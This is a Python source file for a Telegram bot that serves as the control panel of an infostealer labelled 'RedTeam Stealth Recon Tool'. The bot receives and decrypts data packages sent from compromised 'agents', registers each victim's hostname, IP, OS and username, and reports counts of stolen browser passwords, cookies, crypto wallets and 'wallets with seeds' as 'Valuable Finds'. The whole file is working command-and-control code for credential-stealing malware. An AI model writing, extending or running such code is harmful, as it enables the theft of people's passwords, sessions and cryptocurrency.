"""
Telegram Bot for receiving logs and managing agents
"""

import asyncio
import logging
from datetime import datetime
from typing import Optional, Dict, Any
from pathlib import Path
import json

from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application,
    CommandHandler,
    MessageHandler,
    CallbackQueryHandler,
    ContextTypes,
    filters
)
from telegram.constants import ParseMode

from ..config import settings, is_telegram_user_allowed
from ..utils.db_utils import (
    db, get_or_create_agent, create_log_entry,
    get_dashboard_stats, AgentRepository, LogRepository
)
from ..utils.encryption import encryption_manager, decrypt_agent_package
from ..utils.file_handler import file_handler
from ..models.user_model import UserManager

logger = logging.getLogger(__name__)


class TelegramBot:
    """Telegram bot for RT-SRT"""
    
    def __init__(self):
        self.application = None
        self.is_running = False
    
    async def start_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle /start command"""
        user_id = update.effective_user.id
        
        if not is_telegram_user_allowed(user_id):
            await update.message.reply_text(
                "⛔ Access denied. Your user ID is not authorized."
            )
            return
        
        welcome_text = (
            "🔐 *RT-SRT Bot*\n\n"
            "Welcome to RedTeam Stealth Recon Tool control panel.\n\n"
            "*Available commands:*\n"
            "/status - System status\n"
            "/agents - List active agents\n"
            "/logs - Recent logs\n"
            "/stats - Statistics\n"
            "/help - Show this message\n\n"
            f"Your User ID: `{user_id}`"
        )
        
        await update.message.reply_text(
            welcome_text,
            parse_mode=ParseMode.MARKDOWN
        )
    
    async def status_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle /status command"""
        if not await self._check_auth(update):
            return
        
        stats = get_dashboard_stats()
        
        status_text = (
            "📊 *System Status*\n\n"
            f"*Agents:*\n"
            f"├ Total: {stats['agents']['total']}\n"
            f"└ Active: {stats['agents']['active']}\n\n"
            f"*Logs:*\n"
            f"├ Total: {stats['logs']['total']}\n"
            f"└ Last 24h: {stats['logs']['last_24h']}\n\n"
            f"*Collected Data:*\n"
            f"├ Passwords: {stats['browser_data']['passwords']}\n"
            f"├ Cookies: {stats['browser_data']['cookies']}\n"
            f"└ Crypto Wallets: {stats['crypto_wallets']['total']}"
        )
        
        await update.message.reply_text(
            status_text,
            parse_mode=ParseMode.MARKDOWN
        )
    
    async def agents_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle /agents command"""
        if not await self._check_auth(update):
            return
        
        with db.get_session() as session:
            agents = AgentRepository.get_active_agents(session, hours=48)
            
            if not agents:
                await update.message.reply_text("No active agents found.")
                return
            
            agents_text = "👥 *Active Agents*\n\n"
            
            for agent in agents[:10]:  # Limit to 10
                last_seen = agent.last_seen.strftime("%Y-%m-%d %H:%M")
                agents_text += (
                    f"*Agent:* `{agent.agent_id[:8]}...`\n"
                    f"├ Host: {agent.hostname}\n"
                    f"├ IP: {agent.ip_address}\n"
                    f"├ OS: {agent.os_info or 'Unknown'}\n"
                    f"└ Last seen: {last_seen}\n\n"
                )
            
            if len(agents) > 10:
                agents_text += f"_... and {len(agents) - 10} more agents_"
            
            # Add inline keyboard for actions
            keyboard = [
                [InlineKeyboardButton("📥 Download All Logs", callback_data="download_all_logs")],
                [InlineKeyboardButton("🔄 Refresh", callback_data="refresh_agents")]
            ]
            reply_markup = InlineKeyboardMarkup(keyboard)
            
            await update.message.reply_text(
                agents_text,
                parse_mode=ParseMode.MARKDOWN,
                reply_markup=reply_markup
            )
    
    async def logs_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle /logs command"""
        if not await self._check_auth(update):
            return
        
        with db.get_session() as session:
            logs = LogRepository.get_recent_logs(session, limit=10)
            
            if not logs:
                await update.message.reply_text("No logs found.")
                return
            
            logs_text = "📜 *Recent Logs*\n\n"
            
            for log in logs:
                timestamp = log.timestamp.strftime("%Y-%m-%d %H:%M")
                logs_text += (
                    f"*Type:* {log.log_type}\n"
                    f"├ Time: {timestamp}\n"
                    f"├ Items: {log.items_count}\n"
                    f"└ Status: {'✅' if log.is_processed else '⏳'}\n\n"
                )
            
            await update.message.reply_text(
                logs_text,
                parse_mode=ParseMode.MARKDOWN
            )
    
    async def stats_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle /stats command"""
        if not await self._check_auth(update):
            return
        
        stats = get_dashboard_stats()
        storage_stats = file_handler.get_storage_stats()
        
        stats_text = (
            "📈 *Detailed Statistics*\n\n"
            "*Log Types Distribution:*\n"
        )
        
        for log_type, count in stats['logs']['by_type'].items():
            stats_text += f"├ {log_type}: {count}\n"
        
        stats_text += (
            f"\n*Storage Usage:*\n"
            f"├ Total Size: {storage_stats['total_size_mb']} MB\n"
            f"├ Files: {storage_stats['file_count']}\n"
            f"└ Avg Size: {storage_stats['average_file_size_kb']} KB\n\n"
            f"*Valuable Finds:*\n"
            f"├ Crypto-enabled browsers: {stats['browser_data']['crypto_enabled']}\n"
            f"└ Wallets with seeds: {stats['crypto_wallets']['with_seed']}"
        )
        
        await update.message.reply_text(
            stats_text,
            parse_mode=ParseMode.MARKDOWN
        )
    
    async def handle_document(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle received documents (encrypted logs)"""
        if not await self._check_auth(update):
            return
        
        document = update.message.document
        
        # Check file size
        if document.file_size > settings.max_upload_size:
            await update.message.reply_text(
                f"❌ File too large. Maximum size: {settings.max_upload_size / 1024 / 1024} MB"
            )
            return
        
        try:
            # Download file
            file = await document.get_file()
            file_data = await file.download_as_bytearray()
            
            # Decrypt and process
            decrypted_data = decrypt_agent_package(bytes(file_data))
            
            # Extract agent info
            agent_id = decrypted_data.get('agent_id')
            agent_info = decrypted_data.get('system_info', {})
            
            # Create or update agent
            agent = get_or_create_agent(
                agent_id=agent_id,
                hostname=agent_info.get('hostname', 'Unknown'),
                ip_address=agent_info.get('ip_address', '0.0.0.0'),
                os_info=agent_info.get('os', ''),
                username=agent_info.get('username', ''),
                version=decrypted_data.get('version', '1.0.0')
            )
            
            # Save file
            file_path, file_hash = await file_handler.save_log_file_async(
                agent_id=agent_id,
                data=bytes(file_data),
                log_type=decrypted_data.get('data_type', 'unknown'),
                timestamp=datetime.fromisoformat(decrypted_data.get('timestamp'))
            )
            
            # Create log entry
            log_entry = create_log_entry(
                agent_id=agent_id,
                log_type=decrypted_data.get('data_type', 'unknown'),
                data=decrypted_data.get('content', {}),
                file_path=str(file_path),
                file_size=document.file_size,
                file_hash=file_hash
            )
            
            # Send confirmation
            response_text = (
                f"✅ *Log Received*\n\n"
                f"*Agent:* `{agent_id[:8]}...`\n"
                f"*Type:* {decrypted_data.get('data_type', 'unknown')}\n"
                f"*Size:* {document.file_size / 1024:.2f} KB\n"
                f"*Items:* {len(decrypted_data.get('content', {}).get('items', []))}"
            )
            
            await update.message.reply_text(
                response_text,
                parse_mode=ParseMode.MARKDOWN
            )
            
            # Send to log channel if configured
            if settings.telegram_log_channel:
                await context.bot.send_message(
                    chat_id=settings.telegram_log_channel,
                    text=response_text,
                    parse_mode=ParseMode.MARKDOWN
                )
            
        except Exception as e:
            logger.error(f"Error processing document: {e}")
            await update.message.reply_text(
                f"❌ Error processing file: {str(e)}"
            )
    
    async def callback_handler(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle inline keyboard callbacks"""
        query = update.callback_query
        await query.answer()
        
        if not is_telegram_user_allowed(query.from_user.id):
            return
        
        if query.data == "refresh_agents":
            # Re-run agents command
            update.message = query.message
            await self.agents_command(update, context)
            
        elif query.data == "download_all_logs":
            await query.message.reply_text(
                "📦 Preparing archive... This may take a moment."
            )
            
            try:
                # Create archive of all logs
                # This is simplified - in production, implement proper archiving
                await query.message.reply_text(
                    "✅ Archive ready! Use web panel to download."
                )
            except Exception as e:
                await query.message.reply_text(
                    f"❌ Error creating archive: {str(e)}"
                )
    
    async def _check_auth(self, update: Update) -> bool:
        """Check if user is authorized"""
        user_id = update.effective_user.id
        
        if not is_telegram_user_allowed(user_id):
            await update.message.reply_text(
                "⛔ Access denied. Your user ID is not authorized."
            )
            return False
        
        return True
    
    async def error_handler(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle errors"""
        logger.error(f"Update {update} caused error {context.error}")
    
    def setup_handlers(self):
        """Setup bot command handlers"""
        # Commands
        self.application.add_handler(CommandHandler("start", self.start_command))
        self.application.add_handler(CommandHandler("help", self.start_command))
        self.application.add_handler(CommandHandler("status", self.status_command))
        self.application.add_handler(CommandHandler("agents", self.agents_command))
        self.application.add_handler(CommandHandler("logs", self.logs_command))
        self.application.add_handler(CommandHandler("stats", self.stats_command))
        
        # Document handler for encrypted logs
        self.application.add_handler(
            MessageHandler(filters.Document.ALL, self.handle_document)
        )
        
        # Callback queries
        self.application.add_handler(CallbackQueryHandler(self.callback_handler))
        
        # Error handler
        self.application.add_error_handler(self.error_handler)
    
    async def start(self):
        """Start the bot"""
        if self.is_running:
            return
        
        logger.info("Starting Telegram bot...")
        
        # Create application
        self.application = (
            Application.builder()
            .token(settings.telegram_bot_token)
            .build()
        )
        
        # Setup handlers
        self.setup_handlers()
        
        # Start bot
        await self.application.initialize()
        await self.application.start()
        await self.application.updater.start_polling()
        
        self.is_running = True
        logger.info("Telegram bot started successfully")
    
    async def stop(self):
        """Stop the bot"""
        if not self.is_running:
            return
        
        logger.info("Stopping Telegram bot...")
        
        await self.application.updater.stop()
        await self.application.stop()
        await self.application.shutdown()
        
        self.is_running = False
        logger.info("Telegram bot stopped")


# Global bot instance
telegram_bot = TelegramBot()


# Standalone bot runner
async def run_telegram_bot():
    """Run Telegram bot standalone"""
    bot = TelegramBot()
    
    try:
        await bot.start()
        
        # Keep bot running
        while True:
            await asyncio.sleep(1)
            
    except KeyboardInterrupt:
        logger.info("Received interrupt signal")
    finally:
        await bot.stop()


if __name__ == "__main__":
    # Setup logging
    logging.basicConfig(
        format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
        level=logging.INFO
    )
    
    # Run bot
    asyncio.run(run_telegram_bot())